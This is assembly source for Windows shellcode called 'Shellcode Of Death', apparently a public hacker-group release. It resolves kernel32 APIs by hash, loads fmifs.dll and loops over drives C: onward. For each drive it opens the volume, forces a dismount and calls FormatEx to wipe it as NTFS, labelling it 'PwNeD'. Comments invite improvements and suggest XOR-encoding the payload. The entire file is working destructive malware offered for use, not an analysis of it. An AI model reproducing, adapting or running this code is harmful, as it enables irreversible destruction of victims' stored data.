/*
 *                      _     __             _____                     
 *      /\  /\__ _  ___| | __/ _\_   _ ___  /__   \___  __ _ _ __ ___  
 *     / /_/ / _` |/ __| |/ /\ \| | | / __|   / /\/ _ \/ _` | '_ ` _ \ 
 *    / __  / (_| | (__|   < _\ \ |_| \__ \  / / |  __/ (_| | | | | | |
 *    \/ /_/ \__,_|\___|_|\_\\__/\__, |___/  \/   \___|\__,_|_| |_| |_|
 *                               |___/                                 
 *  								  http://hacksys.vfreaks.com/
 *									    hacksysteam@hotmail.com
 * 
 * 					     Shellcode Of Death
 *							              v1.0
 * 	
 * 			Ruei-Min Jiang (@mike820324) a.k.a MicroMike
 * 			Ashfaq Ansari (ashfaq_ansari1989@hotmail.com)
 *
 * Still a lot can be done to improve this shellcode. This is the first release.
 * Further, a lot of improvement and optimization can be done to this shellcode. 
 * Any bugs, suggestions or contribution is most welcomed.
 *
 * Lenth of shellcode: 387 bytes
 * Number of NULL byte: 49
 *
 * Notes: There are more NULL bytes due to a fact that few of the Windows API used
 * 		  accepts input in UNICODE format. Still, NULL bytes can be reduces further.
 *		  We can use any simple encoder to xor encode the shellcode and eventually
 *		  eliminate NULL bytes.
 *				  
 * Things to do:
 *				1. Code cleanup
 *				2. Optimization	
 *        3. Minification
 *        4. Add suggestions
 */
.globl _main

_main:
	               jmp start_shell;	               
/* 
 * %edx store the base address of kernel32.dll (input)
 * %ebx points to the start of symbal name table (input)
 * %ecx contains the destination hash value (input)
 * %eax is the index_counter (output)
 */
 hash_function:
	               xorl %eax,%eax;
    next_entry:
	               mov (%ebx,%eax,4), %esi;
	               addl %edx, %esi;
	               push %ebx;
	               push %eax;
	               xor %ebx, %ebx;
    continue_hash:
	               xor %eax, %eax;
	               lodsb;
	               rol $5, %ebx;
	               addl %eax, %ebx;
	               cmp $0, %eax;
	               jnz continue_hash;
	               ror $5, %ebx;
	               cmp %ecx, %ebx;
	               pop %eax;
	               pop %ebx;
	               je hash_finish;
	               inc %eax;
	               jmp next_entry;
    hash_finish:
	               ret;
	               
/* 
 * input:
 *       set %edx to the dll base address
 *       set %ecx as the hash value you want to compare
 * output:
 *       %eax is the API address
 */	
get_address:
    PE_init:
	               movl %edx, %eax;
	               movl 0x3c(%eax), %eax;
	               movl 0x78(%edx, %eax), %eax;
	               leal (%edx, %eax), %eax;
	               pushl %eax;
	               movl 0x20(%eax), %eax;
	               leal (%edx, %eax), %ebx;
	               call hash_function;
    
	               popl %ebx;
	               movl 0x24(%ebx), %ecx;
	               leal (%edx, %ecx), %ecx;
	               movw (%ecx, %eax, 2), %ax;
	               andl $0x0000ffff, %eax;

	               movl 0x1c(%ebx), %ebx;
	               leal (%edx, %ebx), %ebx;
	               movl (%ebx, %eax, 4), %eax;
	               leal (%edx, %eax), %eax;
	               ret;    
/*
 * hash value for each API
 * LoadLibraryA = 0x331adddc
 * CloseHandle = 0xd7629096
 * CreateFileA = 0xcfb0e506
 * ExitProcess = 0xec468f87
 * Sleep = 0x567a110
 * DeviceIOControl = 0x3b34d4a7
 * --------------fmifs.dll---------------
 * FormatEx = 0xab025b64
 */   
start_shell:
    set_Kernel32_env:
	               xorl %ecx, %ecx
                 movl %fs:0x30, %eax;
                 movl 0xc(%eax), %eax;
                 movl 0x1c(%eax), %eax;	             
	next_module:
	               movl 0x8(%eax), %edx;
				         movl 0x20(%eax), %edi;
				         movl (%eax), %eax;
				         cmp 0x18(%edi), %cl;
				         jne next_module;
				 
    set_hash_table:
				         pushl $0xab025b64;
	               pushl $0x0567a110;
				         pushl $0x3b34d4a7;
	               pushl $0xd7629096;
	               pushl $0xec468f87;
	               pushl $0xcfb0e506;
	               pushl $0x331adddc;
	               movl %esp, %ebp;
    end_hash_table:
    set_api_table:
    init_variable:
	             pushl $7;
	             popl %ecx;
	             xorl %edi, %edi;
    loop_start:
	             cmp $1, %ecx;
	             jne set_kernel32_api;
    set_fmifs_env:
	             pushl %ecx;
	             jmp data_string;
	             back_to_here:
    restore_loadlibrary:
	             movl 0x1c(%esp), %eax;
	             call *%eax;
	             movl %eax, %edx;
	             popl %ecx;
    set_kernel32_api:
	             pushl %ecx;
	             movl (%ebp, %edi, 4), %ecx;
	             call get_address;
	             popl %ecx;
	             pushl %eax;
	             inc %edi;
               loop loop_start;
	             movl %esp, %ebp;
	             jmp start_main_code;
    data_string:
	             call back_to_here;
	             .string "fmifs.dll";    
	             
start_main_code:
    Get_string_addr:
	             jmp 2f;
	             1:;
	             popl %esi;
	Format_start_loop:
	             pushl $23;
				       popl %ecx;				 				 
	format_loop_start:	             
				       movl %ecx, %edi;
	
    CreateFile_call:
	             xorl %edx, %edx;
	             pushl %edx;
	             pushl %edx;
	             pushl $3;
	             pushl %edx;
	             pushl $3;
	             pushl $0xc0000000;
	             pushl %esi;
	             movl 0x14(%ebp), %ebx;
	             call *%ebx;
    Store_File_Handle:
	             pushl %eax;
				       subl $0x4, %esp;
				       xorl %edx, %edx;
    DeviceIOControl_call:
	             pushl %edx;
				       leal 0x4(%esp), %ebx
				       pushl %ebx;
				       pushl %edx;
				       pushl %edx;
				       pushl %edx;
				       pushl %edx;
				       pushl $0x90020;
				       pushl %eax;
				       movl 0x8(%ebp), %ebx
				       call *%ebx;
	close_file_handle:
	             pushl 0x4(%esp);
	             movl 0xc(%ebp), %ebx;
	             call *%ebx;
	
	FormatEx_call:
	             leal call_back-string_start(%esi),%eax;
				       pushl %eax;
				       pushl $4096;
				       pushl $1;
				       leal volume_label-string_start(%esi), %eax;
				       pushl %eax;
				       leal string2_start-string_start(%esi), %eax;
				       pushl %eax;
				       pushl $0xc;
				       leal 0x8(%esi), %eax;
				       pushl %eax;
				       movl (%ebp), %ebx;
				       call *%ebx;
	sleep_call:
	             pushl $200;
				       movl 0x4(%ebp), %ebx
				       call *%ebx;    
	loop_end:
	             movl %edi, %ecx
				       addl $1, 0x8(%esi);
			         loop format_loop_start;
	
    exit_process:
	             push $0;
	             movl 0x10(%ebp), %ebx;
	             call *%ebx;
	  2:;
	             call 1b;
	string_start:
	             .byte 0x5c, 0x00, 0x5c, 0x00, 0x2e, 0x00, 0x5c, 0x00, 0x43, 0x00, 0x3a, 0x00, 0x5c, 0x00, 0x00, 0x00
	string2_start:
				       .byte 0x4e, 0x00, 0x54, 0x00, 0x46, 0x00, 0x53, 0x00, 0x00, 0x00
	/*
	 * Volume Label
	 * Set the name of the Volume label
	 * after formatting the respective volume.
	 * Modify volume_label as you desire.
	 * Deafult value -- PwNeD
	 */
	volume_label:
				       .byte 0x50, 0x00, 0x77, 0x00, 0x4E, 0x00, 0x65, 0x00, 0x44, 0x00, 0x00, 0x00
	call_back:
	             push %ebp;
				       movl %esp, %ebp;
				       xorl %eax, %eax;
				       inc %eax;
				       pop %ebp;
				       ret $0xc;
